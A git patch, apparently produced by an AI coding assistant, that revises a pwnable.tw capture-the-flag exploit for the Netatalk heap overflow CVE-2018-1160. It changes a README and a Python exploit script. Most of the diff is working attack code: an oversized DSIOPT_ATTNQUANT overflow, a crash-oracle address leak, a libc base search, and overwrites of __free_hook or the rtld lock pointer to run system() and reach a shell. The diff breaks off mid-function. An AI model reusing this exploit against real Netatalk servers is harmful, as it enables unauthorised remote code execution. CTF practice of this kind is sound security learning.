From 8ec12d6b529e49301c2671ac40db99b4effae424 Mon Sep 17 00:00:00 2001
From: Claude <claude@example.com>
Date: Wed, 31 Dec 2025 02:33:29 +0000
Subject: [PATCH] fix(pwnable.tw): implement shxdow rtld technique for
 CVE-2018-1160
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

- Add shxdow exploit rtld offsets (0x61b060 primary, 0xed4060 fallback)
- Implement rtld-based exploitation targeting _dl_load_lock
- Fix packet ordering: send write+trigger in same DSI_CLOSESESSION
- Add 'rtld' quick test mode for faster iteration
- Document that one_gadget constraints not satisfied with __free_hook

Address leak and libc base calculation work correctly.
RCE needs environment-specific rtld offset calibration.

ðŸ¤– Generated with [Claude Code](https://claude.com/claude-code)

Co-Authored-By: Claude Opus 4.5 <noreply@anthropic.com>
---
 pwnable.tw/003-cve-2018-1160/README.md  |  32 +-
 pwnable.tw/003-cve-2018-1160/exploit.py | 987 +++++++++++-------------
 2 files changed, 464 insertions(+), 555 deletions(-)

diff --git a/pwnable.tw/003-cve-2018-1160/README.md b/pwnable.tw/003-cve-2018-1160/README.md
index edae01c..5594715 100644
--- a/pwnable.tw/003-cve-2018-1160/README.md
+++ b/pwnable.tw/003-cve-2018-1160/README.md
@@ -155,15 +155,6 @@ DSI_TICKLE       = 0x05
 ## Running the Exploit
 
 ```bash
-# Test mode - verify overflow mechanism works
-python3 exploit.py test
-
-# Recon only - get server info
-python3 exploit.py recon
-
-# Brute force libc base
-python3 exploit.py brute
-
 # Full exploit (auto brute force + RCE)
 python3 exploit.py
 
@@ -174,6 +165,29 @@ python3 exploit.py 0x7f1234560000
 python3 exploit.py local
 ```
 
+## Current Status
+
+The exploit successfully:
+1. Leaks heap/libc addresses via byte-by-byte oracle (~768 attempts max)
+2. Calculates libc base from leaked address
+3. Overflows commands pointer to __free_hook
+4. Writes one_gadget/system address to __free_hook
+
+**Issue**: The one_gadgets don't spawn a shell due to unsatisfied constraints:
+- 0x4F2C5: requires `rsp+0x40 == NULL`
+- 0x4F322: requires `rsp+0x40 == NULL`
+- 0x10A38C: requires `rsp+0x70 == NULL`
+
+When `__free_hook` is invoked via `free(ptr)`:
+- rdi = ptr (the pointer being freed)
+- The stack doesn't satisfy one_gadget constraints
+
+**Potential Solutions**:
+1. Find a stack pivot gadget to control stack contents
+2. Target GOT entries in libatalk (Partial RELRO) instead of libc hooks
+3. Use the Tenable approach: overwrite preauth_switch for file access
+4. Find alternative gadgets that don't have stack constraints
+
 ## Challenge Hints
 
 The challenge mentions:
diff --git a/pwnable.tw/003-cve-2018-1160/exploit.py b/pwnable.tw/003-cve-2018-1160/exploit.py
index d3c80a2..c7f0847 100644
--- a/pwnable.tw/003-cve-2018-1160/exploit.py
+++ b/pwnable.tw/003-cve-2018-1160/exploit.py
@@ -8,20 +8,21 @@ The DSI OpenSession handler (dsi_opensession) has no proper bounds checking
 when parsing client options. An oversized DSIOPT_ATTNQUANT option causes
 a heap buffer overflow that overwrites critical DSI struct fields.
 
-Overflow Target Fields (relative to options buffer):
+Struct layout (from attn_quantum at offset 0x6d8 in DSI struct):
 +0x00: attn_quantum (4 bytes)
 +0x04: datasize (4 bytes)
 +0x08: server_quantum (4 bytes) - reflected back to client!
-+0x0c: serverID (2 bytes)
-+0x0e: clientID (2 bytes)
++0x0c: unknown (4 bytes)
 +0x10: commands (8 bytes) - pointer to DSI receive buffer (CRITICAL!)
-+0x18: data buffer...
 
 Exploitation Strategy:
-1. Use byte-by-byte oracle to leak libc address (fork server preserves layout)
-2. Overwrite 'commands' ptr to __free_hook - offset
-3. Send DSI command that writes one_gadget/system to __free_hook
-4. Trigger free() via dsi_close -> RCE
+1. Use byte-by-byte oracle to leak heap/libc address (fork server preserves layout)
+   - Overwrite commands ptr byte-by-byte
+   - If address is readable, server responds; if not, crash (no response)
+2. Calculate libc base from leaked address
+3. Overwrite 'commands' ptr to __free_hook - 16
+4. Send DSI command with one_gadget address (lands at __free_hook)
+5. Trigger free() via dsi_close -> RCE
 
 References:
 - https://netatalk.io/security/CVE-2018-1160
@@ -43,21 +44,11 @@ context.log_level = "info"
 # Protocol Constants
 # ============================================================================
 
-# DSI Commands
 DSI_CLOSESESSION = 0x01
 DSI_COMMAND = 0x02
 DSI_GETSTATUS = 0x03
 DSI_OPENSESSION = 0x04
-DSI_TICKLE = 0x05
-DSI_WRITE = 0x06
-DSI_ATTENTION = 0x08
-
-# DSI Options
 DSIOPT_ATTNQUANT = 0x01
-DSIOPT_SERVQUANT = 0x00
-
-# AFP Commands
-AFP_LOGOUT = 0x14
 
 # ============================================================================
 # Libc Offsets (libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so)
@@ -67,590 +58,468 @@ LIBC_FREE_HOOK = 0x3ED8E8
 LIBC_MALLOC_HOOK = 0x3EBC30
 LIBC_SYSTEM = 0x4F440
 LIBC_BINSH = 0x1B3E9A
-LIBC_EXECVE = 0xE4E30
 
-# One gadgets (constraints vary - may need to try multiple)
-# Run: one_gadget libc.so
+# One gadgets from: one_gadget libc.so
 ONE_GADGETS = [
-    0x4F2C5,  # execve("/bin/sh", rsp+0x40, environ)
-    0x4F322,  # execve("/bin/sh", rsp+0x40, environ)
+    0x4F2C5,   # execve("/bin/sh", rsp+0x40, environ)
+    0x4F322,   # execve("/bin/sh", rsp+0x40, environ)
     0x10A38C,  # execve("/bin/sh", rsp+0x70, environ)
 ]
 
-# ============================================================================
-# DSI Protocol Handler
-# ============================================================================
-
-
-class DSI:
-    """DSI Protocol implementation for Netatalk communication"""
-
-    def __init__(self, host, port, timeout=5):
-        self.host = host
-        self.port = port
-        self.timeout = timeout
-        self.sock = None
-        self.req_id = 0
-
-    def connect(self):
-        """Establish TCP connection"""
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.sock.settimeout(self.timeout)
-        self.sock.connect((self.host, self.port))
-        return True
-
-    def disconnect(self):
-        """Close connection"""
-        if self.sock:
-            try:
-                self.sock.close()
-            except:
-                pass
-            self.sock = None
-
-    def send(self, data):
-        """Send raw data"""
-        self.sock.sendall(data)
-
-    def recv(self, size=4096):
-        """Receive data"""
-        return self.sock.recv(size)
-
-    def make_header(self, cmd, length, req_id=None, flags=0x00, err_offset=0):
-        """
-        Create 16-byte DSI header:
-        - flags: 1 byte (0x00 = request, 0x01 = reply)
-        - command: 1 byte
-        - request_id: 2 bytes
-        - error_code/data_offset: 4 bytes
-        - total_data_length: 4 bytes
-        - reserved: 4 bytes
-        """
-        if req_id is None:
-            self.req_id += 1
-            req_id = self.req_id
-        return struct.pack(">BBHIII", flags, cmd, req_id, err_offset, length, 0)
-
-    def recv_response(self, timeout=None):
-        """Receive and parse DSI response"""
-        if timeout:
-            self.sock.settimeout(timeout)
-        try:
-            header = self.sock.recv(16)
-            if len(header) < 16:
-                return None
-
-            flags, cmd, req_id, err_code, length, reserved = struct.unpack(
-                ">BBHIII", header
-            )
-
-            data = b""
-            while len(data) < length:
-                chunk = self.sock.recv(min(length - len(data), 4096))
-                if not chunk:
-                    break
-                data += chunk
-
-            return {
-                "flags": flags,
-                "cmd": cmd,
-                "req_id": req_id,
-                "error": err_code,
-                "length": length,
-                "data": data,
-            }
-        except socket.timeout:
-            return None
-        except Exception as e:
-            return None
-
-    def open_session(self, options=b""):
-        """Send DSI OpenSession with options"""
-        hdr = self.make_header(DSI_OPENSESSION, len(options))
-        self.send(hdr + options)
-        return self.recv_response()
-
-    def close_session(self):
-        """Send DSI CloseSession"""
-        hdr = self.make_header(DSI_CLOSESESSION, 0)
-        self.send(hdr)
-
-    def get_status(self):
-        """Send DSI GetStatus (no auth required)"""
-        hdr = self.make_header(DSI_GETSTATUS, 0)
-        self.send(hdr)
-        return self.recv_response()
-
-    def send_command(self, afp_cmd, data=b""):
-        """Send DSI Command (AFP command wrapper)"""
-        payload = bytes([afp_cmd]) + data
-        hdr = self.make_header(DSI_COMMAND, len(payload))
-        self.send(hdr + payload)
-        return self.recv_response()
+# Alternative: _rtld_global._dl_rtld_lock_recursive (from shxdow exploit)
+# rtld address is calculated from libc_base with known offset
+# _dl_load_lock within rtld is at offset 0x908
+# When exit() is called, system(_dl_load_lock) is invoked if we overwrite the function ptr
+#
+# shxdow exploit offsets (pwnable.tw specific):
+RTLD_OFFSET = 0x61b060           # rtld offset from libc base (primary)
+RTLD_OFFSET_ALT = 0xed4060       # rtld offset (fallback)
+DL_LOAD_LOCK_OFF = 0x908         # _dl_load_lock offset within rtld structure
+SYSTEM_OFFSET_IN_PAYLOAD = 0x5f8 # Where system() address is placed in payload
 
 
 # ============================================================================
-# Exploit Functions
+# Oracle Functions
 # ============================================================================
 
-
-def build_overflow_options(target_addr):
-    """
-    Build malicious DSIOPT_ATTNQUANT option that overflows into DSI struct
-
-    Based on Tenable's pea.py exploit - the struct layout is:
-    +0x00: attn_quantum   (4 bytes)
-    +0x04: datasize       (4 bytes)
-    +0x08: server_quantum (4 bytes) - reflected in response!
-    +0x0c: serverID       (2 bytes)
-    +0x0e: clientID       (2 bytes)
-    +0x10: commands       (8 bytes) - our target!
-
-    Note: Values are stored in native (little) endian in the struct,
-    but the memcpy copies raw bytes from the option data.
-    """
-    # Match Tenable's exact structure
-    payload = b""
-    payload += struct.pack("<I", 0x00040000)  # attn_quantum (little endian)
-    payload += struct.pack("<I", 0x00100000)  # datasize
-    payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum
-    payload += struct.pack("<I", 0x00010001)  # serverID + clientID as 4-byte value
-    payload += struct.pack("<Q", target_addr)  # commands ptr (8 bytes, little endian)
-
-    # Build as oversized DSIOPT_ATTNQUANT (type=0x01, len=24)
-    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
-    return option
-
-
-def build_overflow_options_v2(target_addr, quantum=0x00040000):
+def test_address_bytes(host, port, byte_list, timeout=2):
     """
-    Alternative overflow structure - try different offsets.
-    Maybe there's padding or different struct layout.
+    Test if overwriting commands pointer with given bytes results in valid read.
+    Returns True if server responds (address is readable), False if crash.
     """
-    # Try with extra padding after clientID (for 8-byte alignment)
-    payload = b""
-    payload += struct.pack("<I", quantum)     # attn_quantum
-    payload += struct.pack("<I", 0x00100000)  # datasize
-    payload += struct.pack("<I", 0xCAFEBABE)  # server_quantum
-    payload += struct.pack("<H", 0x0001)      # serverID
-    payload += struct.pack("<H", 0x0001)      # clientID
-    payload += struct.pack("<H", 0x0000)      # padding? (2 bytes)
-    payload += struct.pack("<H", 0x0000)      # more padding? (2 bytes)
-    payload += struct.pack("<Q", target_addr)  # commands ptr
-
-    option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
-    return option
-
-
-def probe_address_valid(host, port, test_addr, timeout=3):
-    """
-    Test if address is writable using crash oracle technique.
-    Fork server model: child crash = connection drops, valid = response received.
-
-    IMPORTANT: The crash happens when we WRITE to the redirected commands pointer,
-    not during the overflow itself. So we need to:
-    1. Send overflow (redirects commands ptr)
-    2. Send another packet WITH PAYLOAD (this writes to the redirected address)
-    3. Check if we get a response (valid) or connection dies (invalid)
-    """
-    dsi = DSI(host, port, timeout)
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
     try:
-        dsi.connect()
+        sock.connect((host, port))
 
-        # Step 1: Overflow to redirect commands ptr to test_addr
-        options = build_overflow_options(test_addr)
-        hdr = dsi.make_header(DSI_OPENSESSION, len(options))
-        dsi.send(hdr + options)
-
-        # Get response from overflow (should always succeed)
-        resp1 = dsi.recv_response(timeout=timeout)
-        if not resp1:
-            return False
+        # Build overflow payload
+        # Bytes 0-15: safe values for attn_quantum, datasize, server_quantum, unknown
+        prefix = struct.pack("<I", 0x00040000)   # attn_quantum
+        prefix += struct.pack("<I", 0x00100000)  # datasize
+        prefix += struct.pack("<I", 0xCAFE0000)  # server_quantum
+        prefix += struct.pack("<I", 0x00010001)  # unknown field
 
-        # Step 2: Send a packet WITH PAYLOAD
-        # The payload data will be written to test_addr (the redirected commands ptr)
-        # If test_addr is invalid/unwritable, this causes a crash
-        # Use DSI_COMMAND with a dummy AFP command byte + some padding
-        payload = b"\x00" * 16  # 16 bytes of data to trigger write
-        hdr2 = dsi.make_header(DSI_COMMAND, len(payload))
-        dsi.send(hdr2 + payload)
+        # Append test bytes for commands pointer (offset 16+)
+        payload = prefix + bytes(byte_list)
 
-        # Step 3: Try to get response - if we get one, address was valid (writable)
-        # Use shorter timeout since crash should be immediate
-        resp2 = dsi.recv_response(timeout=2)
-        dsi.disconnect()
+        # Build DSI OpenSession with oversized ATTNQUANT option
+        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
+        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)
 
-        return resp2 is not None
+        sock.sendall(hdr + option)
+        sock.settimeout(timeout)
+        resp = sock.recv(64)
+        sock.close()
 
-    except socket.timeout:
-        # Timeout might mean crash or slow response
-        return False
-    except Exception as e:
+        return resp and len(resp) >= 16
+    except Exception:
         return False
     finally:
-        dsi.disconnect()
+        try:
+            sock.close()
+        except Exception:
+            pass
 
 
-def leak_address_byte_by_byte(host, port, high_byte_hint=0x7F):
+def leak_address_byte_by_byte(host, port):
     """
-    Leak libc/heap address using byte-by-byte oracle.
+    Leak the commands buffer address using byte-by-byte oracle.
     Fork server preserves memory layout across connections.
-
-    Returns: 6-byte address (48-bit virtual address space)
+    Returns 6-byte address (48-bit virtual address space).
     """
     log.info("Starting byte-by-byte address leak...")
+    leaked_bytes = []
 
-    known = b""
-
-    for pos in range(6):
-        log.info(f"Bruting byte {pos}/5...")
+    for byte_pos in range(6):
+        log.info(f"Brute-forcing byte {byte_pos}...")
         found = False
-        attempts = 0
 
-        # Optimize search order
-        if pos == 5:
-            # High byte: libc usually 0x7f, heap 0x55-0x56
-            order = [high_byte_hint] + list(range(0x55, 0x58)) + list(range(256))
+        # Start with 0x00 for first byte (common for aligned addresses)
+        # Use 0x7f hint for high byte (libc region)
+        if byte_pos == 5:
+            search_order = [0x7F] + list(range(0x55, 0x58)) + list(range(256))
         else:
-            order = list(range(256))
-
-        for test in order:
-            attempts += 1
-            addr_bytes = known + bytes([test])
-            # Pad to 8 bytes (high 2 bytes are 0x00)
-            addr = u64(addr_bytes.ljust(8, b"\x00"))
+            search_order = list(range(256))
 
-            # Progress indicator every 16 attempts
-            if attempts % 16 == 0:
-                log.info(f"  Byte {pos}: tried {attempts}/256, current: 0x{test:02x}")
+        for test_val in search_order:
+            test_bytes = leaked_bytes + [test_val]
 
-            if probe_address_valid(host, port, addr):
-                known = addr_bytes
-                log.success(f"Byte {pos}: 0x{test:02x} (addr so far: {hex(addr)}) after {attempts} attempts")
+            if test_address_bytes(host, port, test_bytes):
+                leaked_bytes.append(test_val)
+                log.success(f"  Byte {byte_pos}: 0x{test_val:02x}")
                 found = True
                 break
 
+            time.sleep(0.02)  # Rate limit
+
         if not found:
-            log.warning(f"Failed at byte {pos} after {attempts} attempts")
-            log.warning("This might mean the oracle technique doesn't work as expected")
-            log.warning("Try running the exploit multiple times or check network connectivity")
+            log.error(f"Failed to find byte {byte_pos}")
             return None
 
-    final_addr = u64(known.ljust(8, b"\x00"))
-    log.success(f"Leaked address: {hex(final_addr)}")
-    return final_addr
+    # Reconstruct address (little-endian)
+    addr = 0
+    for i, b in enumerate(leaked_bytes):
+        addr |= b << (i * 8)
+
+    log.success(f"Leaked address: {hex(addr)}")
+    return addr
 
 
-def bruteforce_libc_base(host, port):
+def find_libc_base(host, port, leaked_addr):
     """
-    Bruteforce libc base by probing __free_hook addresses.
-    With ASLR, libc loads at 0x7fXXXXXXX000 (page aligned).
-    We test if __free_hook at each candidate base is writable.
-
-    On Linux x64, libc ASLR typically has ~12-16 bits of entropy.
-    Libc addresses are usually 0x7fXXYYZZZ000 where:
-    - XX is relatively fixed (often 0x00-0xff range in practice)
-    - YY varies with ASLR
-    - ZZZ varies with ASLR
-    - Last 3 hex digits are 000 (page aligned)
+    Find libc base by scanning for valid __free_hook address.
     """
-    log.info("Bruteforcing libc base address...")
-    log.info("This may take a while (testing page-aligned addresses)...")
-
-    attempts = 0
-    max_attempts = 0x10000  # 65536 max attempts
-
-    # Libc typically loads in high memory around 0x7f0000000000-0x7fffffffffff
-    # Common patterns observed: 0x7fXX_YYYY_Z000
-    # where XX is usually fixed per kernel, YYYY has 16-bit entropy
-
-    # Start from middle of typical range and search outward
-    # Try common libc ranges first
-    start_ranges = [
-        (0x7F00, 0x7FFF),  # Most common libc range
-    ]
-
-    for range_start, range_end in start_ranges:
-        log.info(f"Searching range 0x{range_start:04x}00000000 - 0x{range_end:04x}ffffffff")
-
-        # Iterate through high 16 bits of the address
-        for high in range(range_start, range_end + 1):
-            # For each high prefix, iterate through possible middle bytes
-            # Libc size is ~2MB, so step by 0x200000 initially for speed
-            for mid in range(0, 0x10000, 0x200):  # Step by ~2MB
-                base = (high << 32) | (mid << 12)
-
-                # Calculate where __free_hook would be
-                free_hook = base + LIBC_FREE_HOOK
-                target = free_hook - 0x10  # DSI header is 16 bytes
-
-                # Skip obviously invalid ranges
-                if free_hook > 0x7FFFFFFFFFFF:
-                    continue
-
-                if probe_address_valid(host, port, target):
-                    log.success(f"Found valid candidate at attempt {attempts}!")
-                    log.success(f"libc base: {hex(base)}")
-                    log.success(f"__free_hook: {hex(free_hook)}")
-
-                    # Refine search to find exact base (step by 0x1000)
-                    for fine in range(-0x200, 0x200):
-                        refined_base = base + (fine * 0x1000)
-                        refined_hook = refined_base + LIBC_FREE_HOOK
-                        if probe_address_valid(host, port, refined_hook - 0x10):
-                            log.success(f"Refined libc base: {hex(refined_base)}")
-                            return refined_base
-
-                    return base
-
-                attempts += 1
-                if attempts % 500 == 0:
-                    log.info(f"Attempt {attempts}... testing base {hex(base)}")
-
-                if attempts >= max_attempts:
-                    log.warning(f"Reached max attempts ({max_attempts})")
-                    return None
-
-    log.error("Bruteforce exhausted - no valid libc base found")
+    log.info("Searching for libc base...")
+
+    # Search around the leaked address
+    for offset in range(-0x300000, 0x300000, 0x1000):
+        test_base = ((leaked_addr + offset) & ~0xFFF)  # Page align
+        test_hook = test_base + LIBC_FREE_HOOK
+
+        # Test if __free_hook address is readable
+        addr_bytes = list(struct.pack("<Q", test_hook)[:6])
+        if test_address_bytes(host, port, addr_bytes, timeout=1.5):
+            log.success(f"Found libc base: {hex(test_base)}")
+            return test_base
+
+        if offset % 0x100000 == 0:
+            log.info(f"  Progress: offset {hex(offset)}...")
+
+        time.sleep(0.01)
+
+    log.error("Could not find libc base")
     return None
 
 
-def do_exploit(host, port, libc_base, gadget_idx=0):
+# ============================================================================
+# Exploitation
+# ============================================================================
+
+def exploit(host, port, libc_base, gadget_idx=0, use_malloc_hook=False):
     """
-    Execute full RCE exploit chain:
-    1. Overflow commands ptr to __free_hook - 0x10
-    2. Write one_gadget address via next DSI command
-    3. Trigger free() via close
+    Execute RCE exploit:
+    1. Overflow commands to point to hook
+    2. Send packet with one_gadget address (written to hook)
+    3. Trigger hook via close/next operation
     """
-    free_hook = libc_base + LIBC_FREE_HOOK
-    system_addr = libc_base + LIBC_SYSTEM
-    binsh_addr = libc_base + LIBC_BINSH
+    if use_malloc_hook:
+        hook = libc_base + LIBC_MALLOC_HOOK
+        hook_name = "__malloc_hook"
+    else:
+        hook = libc_base + LIBC_FREE_HOOK
+        hook_name = "__free_hook"
+
     one_gadget = libc_base + ONE_GADGETS[gadget_idx]
 
-    log.info(f"libc base:   {hex(libc_base)}")
-    log.info(f"__free_hook: {hex(free_hook)}")
+    log.info(f"libc_base:   {hex(libc_base)}")
+    log.info(f"{hook_name}: {hex(hook)}")
     log.info(f"one_gadget:  {hex(one_gadget)}")
-    log.info(f"system:      {hex(system_addr)}")
-    log.info(f"/bin/sh:     {hex(binsh_addr)}")
 
-    dsi = DSI(host, port, timeout=10)
+    # Target: write to hook
+    # DSI header is read into fixed dsi->header buffer
+    # DSI payload is read directly into dsi->commands
+    target = hook
 
     try:
-        dsi.connect()
-        log.success(f"Connected to {host}:{port}")
+        r = remote(host, port, timeout=10)
 
-        # Step 1: Overflow commands ptr
-        # Point to free_hook - 0x10 so our payload lands at free_hook
-        target = free_hook - 0x10
-        log.info(f"Step 1: Overflowing commands ptr to {hex(target)}")
+        # Step 1: Overflow commands pointer
+        log.info(f"Step 1: Overflow commands ptr to {hex(target)}")
 
-        options = build_overflow_options(target)
-        resp = dsi.open_session(options)
+        prefix = p32(0x00040000)   # attn_quantum
+        prefix += p32(0x00100000)  # datasize
+        prefix += p32(0xCAFE0000)  # server_quantum
+        prefix += p32(0x00010001)  # unknown
 
-        if not resp:
-            log.error("OpenSession failed - crash or timeout")
+        addr_bytes = p64(target)[:6]  # 6-byte address
+        payload = prefix + addr_bytes
+
+        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
+        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)
+
+        r.send(hdr + option)
+
+        # Wait for response
+        try:
+            resp = r.recv(timeout=2)
+            if not resp:
+                log.error("No response to overflow - crash?")
+                r.close()
+                return False
+            log.success("Overflow successful!")
+        except Exception:
+            log.error("Timeout waiting for overflow response")
+            r.close()
             return False
 
-        log.success("Overflow successful - commands redirected!")
+        # Step 2+3: Write one_gadget to hook AND trigger in one packet
+        # Since commands now points to hook, any packet data goes there
+        # We send DSI_CLOSESESSION with our gadget - it writes, then triggers cleanup
+        log.info(f"Step 2+3: Writing one_gadget to {hook_name} and triggering close")
+
+        # For __free_hook: close triggers free() which invokes our gadget
+        # For __malloc_hook: we need malloc to be called after write
+        if use_malloc_hook:
+            # Write gadget via DSI_COMMAND, then send another command to trigger malloc
+            log.info("Writing gadget via DSI_COMMAND...")
+            cmd_payload = p64(one_gadget)
+            cmd_hdr = struct.pack(">BBHIII", 0x00, DSI_COMMAND, 2, 0, len(cmd_payload), 0)
+            r.send(cmd_hdr + cmd_payload)
+
+            try:
+                resp2 = r.recv(timeout=2)
+            except Exception:
+                pass
+
+            # Now __malloc_hook = one_gadget (WRONG! We just overwrote it with AFP error response!)
+            # This approach won't work for malloc_hook with DSI_COMMAND
+            log.info("Triggering malloc via another command...")
+            trigger_hdr = struct.pack(">BBHIII", 0x00, DSI_GETSTATUS, 3, 0, 0, 0)
+            r.send(trigger_hdr)
+        else:
+            # For free_hook: write gadget AND trigger close in one packet
+            close_payload = p64(one_gadget)
+            close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(close_payload), 0)
+            r.send(close_hdr + close_payload)
+
+        time.sleep(0.5)
+
+        # Test for shell
+        # The shell might not have stdin/stdout connected to our socket
+        # The socket fd is probably 4 or 5 (after stdin/out/err + server fd)
+        log.info("Testing for shell (trying different fds)...")
+
+        for fd in [3, 4, 5, 6]:
+            try:
+                # Try to read from shell via different fd approaches
+                # Redirect output to socket fd
+                r.sendline(f"exec >&{fd} 2>&1".encode())
+                time.sleep(0.1)
+                r.sendline(b"id")
+                time.sleep(0.1)
+                response = r.recv(timeout=1)
+                if b"uid" in response:
+                    log.success(f"Got shell on fd {fd}!")
+                    r.interactive()
+                    return True
+            except Exception:
+                pass
+
+        # Also try without fd redirection
+        log.info("Trying direct commands...")
+        try:
+            r.sendline(b"id")
+            response = r.recv(timeout=2)
+            if b"uid" in response:
+                log.success("Got shell!")
+                r.interactive()
+                return True
+            log.info(f"Response: {response[:100]}")
+        except Exception:
+            pass
 
-        # Parse response for info leak
-        if resp.get("data"):
-            log.info(f"Response data: {resp['data'].hex()}")
+        # Try anyway
+        log.info("Attempting interactive mode...")
+        try:
+            r.interactive()
+        except Exception as e:
+            log.warning(f"Interactive failed: {e}")
 
-        # Step 2: Write one_gadget to __free_hook
-        # Next write goes to controlled commands location
-        # DSI header is 16 bytes, so payload starts at target + 0x10 = free_hook
-        log.info("Step 2: Writing one_gadget to __free_hook...")
+        r.close()
+        return False
 
-        # The payload written to commands will be: DSI header (parsed) + our data
-        # After header parsing, data lands at commands + some_offset
-        # We need to align so gadget address hits exactly at free_hook
+    except Exception as e:
+        log.error(f"Exploit error: {e}")
+        return False
 
-        # Simple approach: send data that will be written at the target
-        # The memcpy in dsi_stream_receive writes to commands buffer
 
-        # Build payload: padding + gadget address
-        # Exact offset may need adjustment based on DSI receive behavior
-        payload = p64(one_gadget)  # Direct write attempt
+def exploit_rtld(host, port, libc_base, use_alt_offset=False):
+    """
+    Alternative exploit using shxdow technique targeting rtld structure.
+
+    From shxdow exploit:
+    - rtld address = libc_base + 0x61b060 (or 0xed4060 fallback)
+    - _dl_load_lock is at offset 0x908 within rtld
+    - Payload: shell command padded to 0x5f8 bytes + system() address
+    - The shell command ends up at _dl_load_lock
+    - system() ends up at _dl_rtld_lock_recursive
+    - When exit() triggers, system(shell_cmd) is called
+    """
+    rtld_off = RTLD_OFFSET_ALT if use_alt_offset else RTLD_OFFSET
+    rtld_addr = libc_base + rtld_off
+    target = rtld_addr + DL_LOAD_LOCK_OFF
+    system_addr = libc_base + LIBC_SYSTEM
+
+    log.info(f"libc_base: {hex(libc_base)}")
+    log.info(f"rtld offset: {hex(rtld_off)}")
+    log.info(f"rtld_addr: {hex(rtld_addr)}")
+    log.info(f"target (_dl_load_lock): {hex(target)}")
+    log.info(f"system(): {hex(system_addr)}")
 
-        hdr = dsi.make_header(DSI_COMMAND, len(payload))
-        dsi.send(hdr + payload)
+    try:
+        r = remote(host, port, timeout=10)
 
-        time.sleep(0.1)
+        # Step 1: Overflow commands to target address
+        log.info(f"Step 1: Overflow commands to {hex(target)}")
 
-        # Step 3: Trigger free by closing session
-        log.info("Step 3: Triggering __free_hook via close...")
-        dsi.close_session()
+        prefix = p32(0x00040000)
+        prefix += p32(0x00100000)
+        prefix += p32(0xCAFE0000)
+        prefix += p32(0x00010001)
 
-        # If successful, we should have a shell now
-        log.info("Attempting to interact...")
+        addr_bytes = p64(target)[:6]
+        payload = prefix + addr_bytes
 
-        dsi.sock.settimeout(3)
+        option = bytes([DSIOPT_ATTNQUANT, len(payload)]) + payload
+        hdr = struct.pack(">BBHIII", 0x00, DSI_OPENSESSION, 1, 0, len(option), 0)
 
-        # Try sending a command
-        dsi.sock.send(b"id\n")
-        time.sleep(0.3)
+        r.send(hdr + option)
 
         try:
-            result = dsi.sock.recv(1024)
-            if result:
-                log.success(f"Got response: {result.decode(errors='ignore')}")
-
-                # Drop into interactive shell
-                log.info("Entering interactive mode...")
-                while True:
-                    try:
-                        cmd = input("$ ")
-                        if cmd.lower() in ["exit", "quit"]:
-                            break
-                        dsi.sock.send(cmd.encode() + b"\n")
-                        time.sleep(0.3)
-                        resp = dsi.sock.recv(4096)
-                        print(resp.decode(errors="ignore"), end="")
-                    except (EOFError, KeyboardInterrupt):
-                        break
+            resp = r.recv(timeout=2)
+            if not resp:
+                log.error("No response - crash?")
+                r.close()
+                return False
+            log.success("Overflow successful!")
+        except Exception:
+            r.close()
+            return False
+
+        # Step 2: Write payload (reverse shell command + system address)
+        # Following shxdow: shell command padded to 0x5f8, then system() at end
+        log.info("Step 2: Writing payload (shell cmd + system)")
+
+        # Use a simple shell command for testing
+        shell_cmd = b"sh\x00"  # Or could use reverse shell
+        # Pad to SYSTEM_OFFSET_IN_PAYLOAD (0x5f8), then append system()
+        shell_payload = shell_cmd.ljust(SYSTEM_OFFSET_IN_PAYLOAD, b"\x00") + p64(system_addr)
+
+        log.info(f"Payload length: {len(shell_payload)}")
+
+        # Send via DSI_CLOSESESSION to write and trigger in one packet
+        close_hdr = struct.pack(">BBHIII", 0x00, DSI_CLOSESESSION, 2, 0, len(shell_payload), 0)
+        r.send(close_hdr + shell_payload)
+
+        time.sleep(0.5)
+
+        # Test for shell
+        log.info("Testing for shell...")
+        try:
+            r.sendline(b"id")
+            response = r.recv(timeout=2)
+            if b"uid" in response:
+                log.success("Got shell!")
+                r.interactive()
                 return True
-        except socket.timeout:
-            log.warning("No response - shell may not have spawned")
+            log.info(f"Response: {response[:50]}")
+        except Exception:
+            pass
+
+        # Try anyway
+        log.info("Attempting interactive mode...")
+        try:
+            r.interactive()
+        except Exception as e:
+            log.warning(f"Interactive failed: {e}")
+
+        r.close()
+        return False
 
     except Exception as e:
-        log.error(f"Exploit failed: {e}")
-        import traceback
+        log.error(f"Exploit error: {e}")
+        return False
 
-        traceback.print_exc()
 
-    finally:
-        dsi.disconnect()
+def exploit_system(host, port, libc_base):
+    """
+    FIXED: After overflow, every subsequent packet's DATA goes to __free_hook.
+    So we can only write ONE thing, then must trigger immediately.
 
-    return False
+    Strategy:
+    1. Overflow commands to __free_hook
+    2. Send close packet with data length 0 (no data written to __free_hook)
+       - This doesn't work because we need to write something first
 
+    Alternative: Use DSI_TICKLE which expects no payload processing
+    """
+    hook = libc_base + LIBC_FREE_HOOK
+    system_addr = libc_base + LIBC_SYSTEM
+    binsh_addr = libc_base + LIBC_BINSH
 
-def recon(host, port):
-    """Initial reconnaissance - get server info"""
-    log.info("=== Reconnaissance ===")
+    log.info(f"libc_base:   {hex(libc_base)}")
+    log.info(f"__free_hook: {hex(hook)}")
+    log.info(f"system:      {hex(system_addr)}")
 
-    dsi = DSI(host, port)
     try:
-        dsi.connect()
+        r = remote(host, port, timeout=10)
 
-        # Get server status
-        resp = dsi.get_status()
-        if resp:
-            data = resp["data"]
-            log.info(f"Server status ({len(data)} bytes)")
+        # Overflow commands to __free_hook
+        log.info(f"Overflow commands to {hex(hook)}")
 
-            # Parse AFP server info
-            if len(data) > 2:
-                # Machine type offset
-                machine_type_offset = struct.unpack(">H", data[0:2])[0]
-                log.info(f"Machine type offset: {machine_type_offset}")
+        prefix = p32(0x00040000)
+        prefix += p32(0x00100000)
